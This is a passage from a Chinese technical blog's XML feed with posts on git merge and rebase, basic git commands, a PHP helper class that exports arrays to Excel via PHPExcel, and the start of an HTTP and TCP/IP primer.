alt=""><br>如果master分支的状态没有被更改过，那么这个合并是非常简单的。 bugfix分支的历史记录包含master分支所有的历史记录，所以通过把master分支的位置移动到bugfix的最新分支上，Git 就会合并。这样的合并被称为fast-forward（快进）合并。</p><ul><li>non fast-forward</li></ul><p><img src="分支7.png" alt=""><br><img src="分支8.png" alt=""></p><p>但是，master分支的历史记录有可能在bugfix分支分叉出去后有新的更新。这种情况下，要把master分支的修改内容和bugfix分支的修改内容汇合起来。因此，合并两个修改会生成一个提交。这时，master分支的HEAD会移动到该提交上。</p><p>rebase合并<br><img src="分支7.png" alt=""><br><img src="分支9.png" alt=""><br>首先，rebase bugfix分支到master分支, bugfix分支的历史记录会添加在master分支的后面。如图所示，历史记录成一条线，相当整洁。<br>这时移动提交X和Y有可能会发生冲突，所以需要修改各自的提交时发生冲突的部分。rebase之后，master的HEAD位置不变。因此，要合并master分支和bugfix分支，即是将master的HEAD移动到bugfix的HEAD这里。<br><img src="分支10.png" alt=""></p><p>一般使用原则</p><p>在topic分支中更新merge分支的最新代码，请使用rebase。<br>向merge分支导入topic分支的话，先使用rebase，再使用merge。</p>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>你应该要知道的git的基础</title>
      <link href="/2017/09/07/%E7%8C%B4%E5%AD%90%E9%83%BD%E8%83%BD%E6%87%82%E7%9A%84git%E5%85%A5%E9%97%A8/"/>
      <url>/2017/09/07/%E7%8C%B4%E5%AD%90%E9%83%BD%E8%83%BD%E6%87%82%E7%9A%84git%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="git的基础以及原理"><a href="#git的基础以及原理" class="headerlink" title="git的基础以及原理"></a>git的基础以及原理</h1><h2 id="使用git进行版本管理"><a href="#使用git进行版本管理" class="headerlink" title="使用git进行版本管理"></a>使用git进行版本管理</h2><ul><li>Git是一个分布式版本管理系统，是为了更好地管理Linux内核开发而创立的。</li><li>Git可以在任何时间点，把文档的状态作为更新记录保存起来。因此可以把编辑过的文档复原到以前的状态，也可以显示编辑前后的内容差异。</li><li>编辑旧文件后，试图覆盖较新的文件的时候（即上传文件到服务器时），系统会发出警告，因此可以避免在无意中覆盖了他人的编辑内容。</li></ul><h2 id="理清楚几个概念"><a href="#理清楚几个概念" class="headerlink" title="理清楚几个概念"></a>理清楚几个概念</h2><h3 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h3><p>数据库 (Repository) 是记录文件或目录状态的地方，存储着内容修改的历史记录。在数据库的管理下，把文件和目录修改的历史记录放在对应的目录下。</p><h3 id="本地和远程Repository"><a href="#本地和远程Repository" class="headerlink" title="本地和远程Repository"></a>本地和远程Repository</h3><ul><li>远程数据库: 配有专用的服务器，为了多人共享而建立的数据库。</li><li>本地数据库: 为了方便用户个人使用，在自己的机器上配置的数据库。</li></ul><h3 id="修改记录的提交"><a href="#修改记录的提交" class="headerlink" title="修改记录的提交"></a>修改记录的提交</h3><p>若要把文件或目录的添加和变更保存到数据库，就需要进行提交。<br>执行提交后，数据库中会生成上次提交的状态与当前状态的差异记录（也被称为revision）。<br>提交是以时间顺序排列状态被保存到数据库中的。凭借该提交和最新的文件状态，就可以知道过去的修改记录以及内容。<br>系统会根据修改的内容计算出没有重复的40位英文及数字来给提交命名。指定这个命名，就可以在数据库中找到对应的提交</p><h3 id="工作树和索引"><a href="#工作树和索引" class="headerlink" title="工作树和索引"></a>工作树和索引</h3><p>在Git管理下，大家实际操作的目录被称为工作树。<br>在数据库和工作树之间有索引，索引是为了向数据库提交作准备的区域。</p><p>数据库 – 索引 – 工作树</p><p>Git在执行提交的时候，不是直接将工作树的状态保存到数据库，而是将设置在中间索引区域的状态保存到数据库。因此，要提交文件，首先需要把文件加入到索引区域中。<br>所以，凭借中间的索引，可以避免工作树中不必要的文件提交，还可以将文件修改内容的一部分加入索引区域并提交。</p><h1 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h1><h2 id="命令行安装git"><a href="#命令行安装git" class="headerlink" title="命令行安装git"></a>命令行安装git</h2><p>从Git网站下载Git的安装程序并安装，<a href="http://git-scm.com/" target="_blank" rel="noopener">http://git-scm.com/</a></p><h2 id="初始设定"><a href="#初始设定" class="headerlink" title="初始设定"></a>初始设定</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"&lt;用户名&gt;"</span></span><br><span class="line">$ git config --global user.email <span class="string">"&lt;电子邮件&gt;"</span></span><br></pre></td></tr></table></figure><h1 id="本地新建-git-Repository"><a href="#本地新建-git-Repository" class="headerlink" title="本地新建 git Repository"></a>本地新建 git Repository</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ mkdir tutorial</span><br><span class="line">$ <span class="built_in">cd</span> tutorial</span><br><span class="line">$ git init</span><br></pre></td></tr></table></figure><p>这样我们就新建了一个本地的git Repository</p><h2 id="在数据库中新建文件"><a href="#在数据库中新建文件" class="headerlink" title="在数据库中新建文件"></a>在数据库中新建文件</h2><p>在tutorial目录新建一个文件，然后将文件添加到数据库。<br>首先在tutorial目录里新建一个名为「sample.txt」的文本文件，请在文件中输入以下的内容：</p><pre><code>Hello World</code></pre><h2 id="查看工作数据库中工作树和索引的状态"><a href="#查看工作数据库中工作树和索引的状态" class="headerlink" title="查看工作数据库中工作树和索引的状态"></a>查看工作数据库中工作树和索引的状态</h2><pre><code>$ git status</code></pre><p>返回信息:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="comment"># On branch master</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Initial commit</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Untracked files:</span></span><br><span class="line">    <span class="comment">#   (use "git add &lt;file&gt;..." to include in what will be committed)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#     sample.txt</span></span><br><span class="line">    nothing added to commit but untracked files present (use <span class="string">"git add"</span> to track)</span><br><span class="line">```    </span><br><span class="line">从status响应我们可以看到‘sample.txt’目前不是历史记录对象。请首先把‘sample.txt’加入到索引，就可以追踪它的变更了。</span><br><span class="line">将文件加入到索引，要使用add命令。在&lt;file&gt;指定加入索引的文件。用空格分割可以指定多个文件。</span><br><span class="line"> ``` bash</span><br><span class="line">   </span><br><span class="line">    $ git add &lt;file&gt;..</span><br><span class="line"> ```   </span><br><span class="line">把sample.txt从工作目录加入到索引</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    $ git add sample.txt</span><br></pre></td></tr></table></figure></p><h2 id="提交文件到本地数据中"><a href="#提交文件到本地数据中" class="headerlink" title="提交文件到本地数据中"></a>提交文件到本地数据中</h2><p>上个步骤，我们已经把文件添加到索引当中，接下来需要把索引的文件提交到数据库中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ git commit -m <span class="string">"摘要"</span></span><br></pre></td></tr></table></figure></p><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">$ git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><h1 id="共享本地数据库"><a href="#共享本地数据库" class="headerlink" title="共享本地数据库"></a>共享本地数据库</h1><p>平时开发的时候，一般都是协作开发一个项目，因此，需要共享团队中每个人的代码库，也就是我们上面步骤的本地数据库</p><h2 id="建立连接到远程数据库中"><a href="#建立连接到远程数据库中" class="headerlink" title="建立连接到远程数据库中"></a>建立连接到远程数据库中</h2><p>新建数据库，比如我们可以再github上面新建数据库，然后获取到远程数据库地址<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ git remote add &lt;name&gt; &lt;url&gt;</span><br></pre></td></tr></table></figure></p><p>在<name>处输入远程数据库名称，在<url>处指定远程数据库的URL。    </url></name></p><p><name>是远程数据库的别名 下次推送的时候就不需要输入长串的远程数据库地址了，直接使用名字推送<br>如：<br>        $ git remote add origin https://[your_space_id].github.com/git/[your_project_key]/tutorial.git</name></p><h2 id="推送本地数据库到远程数据库中"><a href="#推送本地数据库到远程数据库中" class="headerlink" title="推送本地数据库到远程数据库中"></a>推送本地数据库到远程数据库中</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">    $ git push &lt;repository&gt; &lt;refspec&gt;...</span><br><span class="line">```    </span><br><span class="line">使用push命令向数据库推送更改内容。&lt;repository&gt;处输入目标地址，&lt;refspec&gt;处指定推送的分支。</span><br><span class="line">指定了-u选项，那么下一次推送时就可以省略分支名称了。但是，首次运行指令向空的远程数据库推送时，必须指定远程数据库名称和分支名称。</span><br><span class="line">如:</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    $ git push -u origin master</span><br><span class="line"> ```   </span><br><span class="line"><span class="comment">## 克隆远程数据库到本地数据库</span></span><br><span class="line">使用<span class="built_in">clone</span>指令可以复制数据库，在&lt;repository&gt;指定远程数据库的URL，</span><br><span class="line">在&lt;directory&gt;指定新目录的名称。</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    $ git <span class="built_in">clone</span> &lt;repository&gt; &lt;directory&gt;</span><br></pre></td></tr></table></figure><p>注意：clone到本地之后，我们可以当成本地数据库一样操作，如新建文件-&gt;添加到索引-&gt;提交到数据库-&gt;push到远程数据库<br>其中提交到远程数据库的时候，不需要连接到远程数据库这一步骤，因为clone的时候已经指定了远程数据库</p><h2 id="拉取远程数据库到本地数据库"><a href="#拉取远程数据库到本地数据库" class="headerlink" title="拉取远程数据库到本地数据库"></a>拉取远程数据库到本地数据库</h2><p>获取到远程数据库的数据更新</p><pre><code class="bash">$ git pull &lt;repository&gt; &lt;refspec&gt;...</code></pre><p>使用pull命令向数据库推送更改内容。<repository>处输入目标地址，<refspec>处指定推送的分支。</refspec></repository></p><h1 id="合并修改记录"><a href="#合并修改记录" class="headerlink" title="合并修改记录"></a>合并修改记录</h1><p>在执行pull之后，进行下一次push之前，如果其他人进行了推送内容到远程数据库的话，那么你的push将被拒绝。<br>这种情况下，在读取别人push的变更并进行合并操作之前，你的push都将被拒绝。这是因为，如果不进行合并就试图覆盖已有的变更记录的话，其他人push的变更（图中的提交C）就会丢失。</p><p>因此，每次提交代码之前，需要pull一下，合并修改记录，然后再提交。合并的时候，Git会自动合并已有的变更点！不过，也存在不能自动合并的情况</p><h2 id="解决合并修改冲突"><a href="#解决合并修改冲突" class="headerlink" title="解决合并修改冲突"></a>解决合并修改冲突</h2><p>如果远程数据库和本地数据库的同一个地方都发生了修改的情况下，因为无法自动判断要选用哪一个修改，所以就会发生冲突。<br>解决方法，找到冲突文件，文件里，==分割线上方是本地数据库的内容, 修改完后，执行提交</p>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>基于phpexel封装成的数组数据导出成exel表的工具类</title>
      <link href="/2017/09/05/ArrayToexel/"/>
      <url>/2017/09/05/ArrayToexel/</url>
      
        <content type="html"><![CDATA[<p>源码请<a href="https://github.com/shisiying/ArrayToExel" target="_blank" rel="noopener">点此</a><br>ArrayToExel</p><p>基于phpexel封装成的数组数据导出成exel表的工具类<br><a id="more"></a></p><h2 id="使用之前"><a href="#使用之前" class="headerlink" title="使用之前"></a>使用之前</h2><p>源码中需要导入自己路径的phpexel包路径，在__construct中进行修改</p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>引入工具类之后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$exel=<span class="keyword">new</span> ArrayToExcel($rowAttr,$options);</span><br><span class="line">$exel-&gt;push($data_for_export);</span><br></pre></td></tr></table></figure><p>需要定义$rowAttr,$options,$data_for_export</p><h4 id="定义-rowAttr的格式-即定义每一行的样式"><a href="#定义-rowAttr的格式-即定义每一行的样式" class="headerlink" title="定义$rowAttr的格式,即定义每一行的样式"></a>定义$rowAttr的格式,即定义每一行的样式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$rowAttr=<span class="keyword">array</span>(</span><br><span class="line">           <span class="string">'firstRowHeight'</span>=&gt;<span class="string">''</span>, <span class="comment">//第一行的列名的高度</span></span><br><span class="line">           <span class="string">'height'</span>=&gt;<span class="string">''</span>         <span class="comment">//第二行以后的高度</span></span><br><span class="line">       );</span><br></pre></td></tr></table></figure><h4 id="定义-options的格式，即定义整个exel文件的相关属性"><a href="#定义-options的格式，即定义整个exel文件的相关属性" class="headerlink" title="定义$options的格式，即定义整个exel文件的相关属性"></a>定义$options的格式，即定义整个exel文件的相关属性</h4> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$options=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'excelname'</span>=&gt;<span class="string">''</span>,  <span class="comment">//导出的excel的文件的名称</span></span><br><span class="line">    <span class="string">'creater'</span>=&gt;<span class="string">''</span>,             <span class="comment">//创建者,</span></span><br><span class="line">    <span class="string">'lastmodified'</span>=&gt;<span class="string">''</span>,        <span class="comment">//最近修改时间</span></span><br><span class="line">    <span class="string">'title'</span>=&gt;<span class="string">''</span>,<span class="comment">//当前活动的主题</span></span><br><span class="line">    <span class="string">'subject'</span>=&gt;<span class="string">''</span>,</span><br><span class="line">    <span class="string">'description'</span>=&gt;<span class="string">''</span>,</span><br><span class="line">    <span class="string">'keywords'</span>=&gt;<span class="string">''</span>,</span><br><span class="line">    <span class="string">'category'</span>=&gt;<span class="string">''</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="定义-data-for-export的格式，即定义每一个sheet需要写入的值"><a href="#定义-data-for-export的格式，即定义每一个sheet需要写入的值" class="headerlink" title="定义$data_for_export的格式，即定义每一个sheet需要写入的值"></a>定义$data_for_export的格式，即定义每一个sheet需要写入的值</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    $data_for_export=[</span><br><span class="line">                [<span class="string">'data'</span>=&gt;[...],<span class="string">'colAttr'</span>=&gt;[..],<span class="string">'sheettitle'</span>=&gt;[..]]</span><br><span class="line">                ]</span><br><span class="line">要写入多个sheet,只需再添加一个数组</span><br><span class="line"></span><br><span class="line">    $data_for_export=[</span><br><span class="line">                    [<span class="string">'data'</span>=&gt;[...],<span class="string">'colAttr'</span>=&gt;[..],<span class="string">'sheettitle'</span>=&gt;[..]],</span><br><span class="line">                    [<span class="string">'data'</span>=&gt;[...],<span class="string">'colAttr'</span>=&gt;[..],<span class="string">'sheettitle'</span>=&gt;[..]]</span><br><span class="line"></span><br><span class="line">                    ]</span><br><span class="line">                    </span><br><span class="line">data : 我们要插入的二维数组</span><br><span class="line"></span><br><span class="line">colAttr : 列的属性设置，格式为:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">array</span>(<span class="comment">//列的属性设置</span></span><br><span class="line">                  <span class="string">'colName'</span>=&gt;<span class="string">''</span>,<span class="comment">//第一行的列名</span></span><br><span class="line">                  <span class="string">'keyName'</span>=&gt;<span class="string">''</span>,<span class="comment">//每一列对应的赋值数组的key值</span></span><br><span class="line">                   <span class="string">'width'</span>=&gt;<span class="string">''</span>  <span class="comment">//A列的宽度</span></span><br><span class="line">             )</span><br><span class="line">sheettitle : sheet表的标题</span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h4 id="写入一个sheet"><a href="#写入一个sheet" class="headerlink" title="写入一个sheet"></a>写入一个sheet</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">             $data=<span class="keyword">array</span>(...);<span class="comment">//二维数组 </span></span><br><span class="line">             $colAttr=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'A'</span>=&gt;<span class="keyword">array</span>(<span class="comment">//列的属性设置</span></span><br><span class="line">                    <span class="string">'colName'</span>=&gt;<span class="string">'平台单号'</span>,<span class="comment">//第一行的列名</span></span><br><span class="line">                    <span class="string">'keyName'</span>=&gt;<span class="string">'order_no'</span>,<span class="comment">//每一列对应的赋值数组的key值</span></span><br><span class="line">                    <span class="string">'width'</span>=&gt;<span class="number">25</span>  <span class="comment">//A列的宽度</span></span><br><span class="line">                ),</span><br><span class="line">                <span class="string">'B'</span>=&gt;<span class="keyword">array</span>(<span class="comment">//列的属性设置</span></span><br><span class="line">                        <span class="string">'colName'</span>=&gt;<span class="string">'平台名称'</span>,<span class="comment">//第一行的列名</span></span><br><span class="line">                        <span class="string">'keyName'</span>=&gt;<span class="string">'shop_name'</span>,<span class="comment">//每一列对应的赋值数组的key值</span></span><br><span class="line">                        <span class="string">'width'</span>=&gt;<span class="number">20</span>   <span class="comment">//B列的宽度</span></span><br><span class="line">                 )</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//行的属性设置</span></span><br><span class="line">            $rowAttr=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'firstRowHeight'</span>=&gt;<span class="string">'20'</span>, <span class="comment">//第一行的列名的高度</span></span><br><span class="line">                <span class="string">'height'</span>=&gt;<span class="string">'20'</span>         <span class="comment">//2-OO无从行的高度</span></span><br><span class="line">            );</span><br><span class="line">            $options=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'excelname'</span>=&gt;date(<span class="string">'Y/m/d'</span>,strtotime($start)).<span class="string">'-'</span>.date(<span class="string">'Y/m/d'</span>,strtotime($end)).<span class="string">'销售订单明细表'</span>,  <span class="comment">//导出的excel的文件的名称</span></span><br><span class="line">                <span class="string">'creater'</span>=&gt;<span class="string">'seven'</span>,             <span class="comment">//创建者,</span></span><br><span class="line">                <span class="string">'lastmodified'</span>=&gt;<span class="string">''</span>,        <span class="comment">//最近修改时间</span></span><br><span class="line">                <span class="string">'title'</span>=&gt;<span class="string">'销售订单明细表'</span>,<span class="comment">//当前活动的主题</span></span><br><span class="line">                <span class="string">'subject'</span>=&gt;<span class="string">'销售订单明细表'</span>,</span><br><span class="line">                <span class="string">'description'</span>=&gt;<span class="string">'数据导出'</span>,</span><br><span class="line">                <span class="string">'keywords'</span>=&gt;<span class="string">'数据导出'</span>,</span><br><span class="line">                <span class="string">'category'</span>=&gt;<span class="string">'本期销售订单明细表'</span></span><br><span class="line">            );</span><br><span class="line">             <span class="comment">//每个sheet需要写入的内容</span></span><br><span class="line">              $data_for_export=[</span><br><span class="line">                        [</span><br><span class="line">                            <span class="string">'data'</span>=&gt;$data,</span><br><span class="line">                            <span class="string">'colAttr'</span>=&gt;$colAttr,</span><br><span class="line">                            <span class="string">'sheettitle'</span>=&gt;<span class="string">'本期销售订单明细表'</span></span><br><span class="line">                        ]</span><br><span class="line">                    ];</span><br><span class="line">              $exel=<span class="keyword">new</span> ArrayToExcel($rowAttr,$options);</span><br><span class="line">              $exel-&gt;push($data_for_export);</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 写入多个sheet</span></span><br><span class="line"></span><br><span class="line">             $data=<span class="keyword">array</span>(...);<span class="comment">//二维数组 </span></span><br><span class="line">             <span class="comment">//列的属性设置</span></span><br><span class="line">             $colAttr=<span class="keyword">array</span>(</span><br><span class="line">                  <span class="string">'A'</span>=&gt;<span class="keyword">array</span>(<span class="comment">//列的属性设置</span></span><br><span class="line">                      <span class="string">'colName'</span>=&gt;<span class="string">'平台单号'</span>,<span class="comment">//第一行的列名</span></span><br><span class="line">                      <span class="string">'keyName'</span>=&gt;<span class="string">'order_no'</span>,<span class="comment">//每一列对应的赋值数组的key值</span></span><br><span class="line">                       <span class="string">'width'</span>=&gt;<span class="number">25</span>  <span class="comment">//A列的宽度</span></span><br><span class="line">                    ),</span><br><span class="line">                   <span class="string">'B'</span>=&gt;<span class="keyword">array</span>(<span class="comment">//列的属性设置</span></span><br><span class="line">                       <span class="string">'colName'</span>=&gt;<span class="string">'平台名称'</span>,<span class="comment">//第一行的列名</span></span><br><span class="line">                       <span class="string">'keyName'</span>=&gt;<span class="string">'shop_name'</span>,<span class="comment">//每一列对应的赋值数组的key值</span></span><br><span class="line">                        <span class="string">'width'</span>=&gt;<span class="number">20</span>   <span class="comment">//B列的宽度</span></span><br><span class="line">                     ),</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//行的属性设置</span></span><br><span class="line">            $rowAttr=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'firstRowHeight'</span>=&gt;<span class="string">'20'</span>, <span class="comment">//第一行的列名的高度</span></span><br><span class="line">                <span class="string">'height'</span>=&gt;<span class="string">'20'</span>         <span class="comment">//2-OO无从行的高度</span></span><br><span class="line">            );</span><br><span class="line">            $options=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'excelname'</span>=&gt;date(<span class="string">'Y/m/d'</span>,strtotime($start)).<span class="string">'-'</span>.date(<span class="string">'Y/m/d'</span>,strtotime($end)).<span class="string">'销售订单明细表'</span>,  <span class="comment">//导出的excel的文件的名称</span></span><br><span class="line">                <span class="string">'creater'</span>=&gt;<span class="string">'seven'</span>,             <span class="comment">//创建者,</span></span><br><span class="line">                <span class="string">'lastmodified'</span>=&gt;<span class="string">''</span>,        <span class="comment">//最近修改时间</span></span><br><span class="line">                <span class="string">'title'</span>=&gt;<span class="string">'销售订单明细表'</span>,<span class="comment">//当前活动的主题</span></span><br><span class="line">                <span class="string">'subject'</span>=&gt;<span class="string">'销售订单明细表'</span>,</span><br><span class="line">                <span class="string">'description'</span>=&gt;<span class="string">'数据导出'</span>,</span><br><span class="line">                <span class="string">'keywords'</span>=&gt;<span class="string">'数据导出'</span>,</span><br><span class="line">                <span class="string">'category'</span>=&gt;<span class="string">'本期销售订单明细表'</span></span><br><span class="line">            );</span><br><span class="line">             <span class="comment">//每个sheet需要写入的内容</span></span><br><span class="line">              $data_for_export=[</span><br><span class="line">                        [</span><br><span class="line">                           <span class="string">'data'</span>=&gt;$this_month_refunds,</span><br><span class="line">                           <span class="string">'colAttr'</span>=&gt;$colAttr,</span><br><span class="line">                           <span class="string">'sheettitle'</span>=&gt;<span class="string">'本期退款订单明细表'</span></span><br><span class="line">                         ],</span><br><span class="line">                         [</span><br><span class="line">                            <span class="string">'data'</span>=&gt;$refunds,</span><br><span class="line">                            <span class="string">'colAttr'</span>=&gt;$colAttr,</span><br><span class="line">                            <span class="string">'sheettitle'</span>=&gt;<span class="string">'上期退款订单明细表'</span></span><br><span class="line">                         ],</span><br><span class="line">                    ];</span><br><span class="line">              $exel=<span class="keyword">new</span> ArrayToExcel($rowAttr,$options);</span><br><span class="line">              $exel-&gt;push($data_for_export);</span><br></pre></td></tr></table></figure><h2 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h2><hr><ul><li style="list-style: none"><input type="checkbox"> 添加tp支持</li><li style="list-style: none"><input type="checkbox"> 添加laravel支持</li><li style="list-style: none"><input type="checkbox"> composer packagist</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>http图解系列-1</title>
      <link href="/2017/09/01/http%E5%9B%BE%E8%A7%A3%E7%B3%BB%E5%88%97-1/"/>
      <url>/2017/09/01/http%E5%9B%BE%E8%A7%A3%E7%B3%BB%E5%88%97-1/</url>
      
        <content type="html"><![CDATA[<p> 带着问题踏上http之路<br>之前在面试的时候，很多面试官都喜欢问:当我们再网页浏览器的地址栏输入url时候，web页面是如何呈现的，顿时哑口无言，无非考的就是问你熟不熟悉http协议而已，当时想的很复杂，甚至把在框架处理周期都说上去了，真的是基础薄弱呀，现在想想还是有点丢人，论平时读书的重要性。<br>最简单的回答是:<br><img src="输入url响应的流程.png" alt="输入url响应的流程"><br>web是建立在http协议上通信的，接下来我们就带着这个问题深入学习http协议之旅<br><a id="more"></a></p><h1 id="网络基础TCP-IP"><a href="#网络基础TCP-IP" class="headerlink" title="网络基础TCP/IP"></a>网络基础TCP/IP</h1><p>通常使用的网络实在tcp/ip协议族的基础运作的，而http属于其内部的一个子集</p><h2 id="什么是TCP-IP？"><a href="#什么是TCP-IP？" class="headerlink" title="什么是TCP/IP？"></a>什么是TCP/IP？</h2><p>计算机与网络要相互通信，双方就必须基于相同的方法，并且需要一种规则，而这种规则被称为协议，协议中存在各种各样的内容，从电缆的规格到ip地址的选定方法，寻找异地用户的方法，双方建立通信的顺序以及web页面现实需要处理的步骤，像这样把与互联网关联的协议集合起来总成为TCP/IP。</p><h2 id="TCP-IP的分层管理"><a href="#TCP-IP的分层管理" class="headerlink" title="TCP/IP的分层管理"></a>TCP/IP的分层管理</h2><p>分层是很重要的一点，可以分为四个层次，应用层，传输层，网络层和数据链路层，好处是，方便每一层的修改设计，简单</p><h3 id="各层的作用"><a href="#各层的作用" class="headerlink" title="各层的作用"></a>各层的作用</h3><ul><li>应用层:决定了向用户提供应用服务时通信的活动，预存了各类通用的通用服务，比如ftp，dns，而HTTP协议也属于该层</li><li>传输层:对应用层提供处于网络链接中的两台计算机之间啊的数据传输。有两个性质不同的协议TCP和UDP</li><li>网络层:处理网络上流动的数据包，数据包时网络传输最小的最小单位，该层规定了通过怎么样的路径到达随访计算机，并把数据包船传送给对方</li><li>链路层 处理连接网络的硬件部分，包括控制操作系统，硬件的设备驱动等物理可见部分</li></ul><h3 id="TCP-IP通信传输流"><a href="#TCP-IP通信传输流" class="headerlink" title="TCP/IP通信传输流"></a>TCP/IP通信传输流</h3><p><img src="传输流.png" alt="传输流"></p><h3 id="与HTTP关系密切的协议-IP、TCP和DNS"><a href="#与HTTP关系密切的协议-IP、TCP和DNS" class="headerlink" 